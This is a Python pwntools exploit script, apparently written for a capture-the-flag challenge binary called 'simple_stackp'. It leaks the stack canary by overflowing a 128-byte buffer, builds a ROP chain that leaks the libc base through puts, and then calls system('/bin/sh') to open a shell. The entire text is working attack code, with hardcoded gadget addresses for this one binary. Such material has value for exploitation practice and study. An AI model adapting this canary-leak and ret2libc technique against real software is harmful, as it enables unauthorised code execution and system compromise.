from pwn import *

context.binary = "./simple_stackp"
elf = context.binary
libc = elf.libc

def start():
    return process()

p = start()

# =============================================
# STEP 1: LEAK CANARY
# =============================================
p.recvuntil(b"fun? Rate it on a scale from 0-9.\n")
p.sendline(b"129")  # Max size to trigger overflow

# Send payload to leak canary
payload = b"A"*128
p.send(payload)

# Receive response and extract canary
p.recvuntil(b"Fascinating. \"")
p.recv(128)  # Skip our input
canary = b"\x00" + p.recv(7)
log.success(f"Canary leaked: {hex(u64(canary))}")

# =============================================
# STEP 2: FIND PIVOT ADDRESS
# =============================================
# Find a writable section (like .bss)
bss = elf.bss()
log.info(f".bss section at: {hex(bss)}")

# =============================================
# STEP 3: PREPARE ROP CHAIN IN WRITABLE MEMORY
# =============================================
# Find necessary gadgets
rop = ROP(elf)
pop_rdi = 0x0000000000402218
ret = 0x000000000040101a

# Find PLT entries
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']

# =============================================
# STEP 4: PERFORM STACK PIVOT
# =============================================
# 1. First pivot to leak libc address
pivot_payload = flat({
    128: canary,
    136: p64(bss),  # New RBP (points to .bss)
    144: p64(pop_rdi),
    152: p64(puts_got),
    160: p64(puts_plt),
    168: p64(main)   # Return to main for second exploit stage
})

p.sendlineafter(b"fun?", b"200")  # Larger size for our payload
p.send(pivot_payload)

# Receive leaked libc address
puts_leak = u64(p.recvline().strip().ljust(8, b"\x00"))
libc.address = puts_leak - libc.sym.puts
log.success(f"Libc base: {hex(libc.address)}")

# =============================================
# STEP 5: FINAL EXPLOIT WITH SYSTEM
# =============================================
# Now with libc known, call system("/bin/sh")
system = libc.sym.system
binsh = next(libc.search(b"/bin/sh"))

final_payload = flat({
    128: canary,
    136: p64(bss + 0x100),  # New RBP
    144: p64(ret),          # Stack alignment
    152: p64(pop_rdi),
    160: p64(binsh),
    168: p64(system)
})

p.sendlineafter(b"fun?", b"200")
p.send(final_payload)

p.interactive()